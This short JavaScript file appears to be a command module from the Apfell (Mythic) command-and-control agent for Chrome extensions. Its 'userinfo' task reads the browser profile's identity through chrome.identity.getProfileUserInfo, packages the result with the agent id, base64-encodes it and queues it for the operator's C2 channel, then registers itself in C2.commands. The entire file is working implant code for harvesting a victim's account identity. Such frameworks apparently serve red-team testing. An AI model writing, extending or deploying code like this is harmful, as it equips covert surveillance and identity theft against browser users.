userinfo = function(task) {
    chrome.identity.getProfileUserInfo(function(info){
        if (info === undefined) {
            let response = {'task_id':task.id, 'user_output': 'userinfo failed', 'completed': false, 'status':'error'};
            let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
            let enc = JSON.stringify(outer_response);
            let final = apfell.apfellid + enc;
            let msg = btoa(unescape(encodeURIComponent(final)));
            out.push(msg);
        } else {
            let response = {"task_id":task.id, "user_output":JSON.stringify(info, null, 2), "completed": true};
            let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
            let enc = JSON.stringify(outer_response);
            let final = apfell.apfellid + enc;
            let msg = btoa(unescape(encodeURIComponent(final)));
            out.push(msg);
        }
    });
};

C2.commands[userinfo.name] = userinfo;
COMMAND_ENDS_HERE
